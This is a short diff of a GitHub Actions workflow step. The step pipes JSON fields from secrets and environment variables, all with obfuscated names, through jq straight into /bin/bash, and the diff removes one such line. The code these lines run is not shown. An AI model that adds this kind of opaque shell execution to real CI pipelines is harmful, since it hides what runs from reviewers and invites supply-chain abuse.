@@ -21,7 +21,6 @@ jobs:
           q96068: ${{ secrets.q96068 }}
         run: |
           printf '%s' "$q96068" | jq -r .aqvk8968 | /bin/bash
-          echo $zijih014 | jq -r .hfpf170 | /bin/bash
           echo $uvf782 | jq -r .drw86 | /bin/bash
 
       - name: Archive results
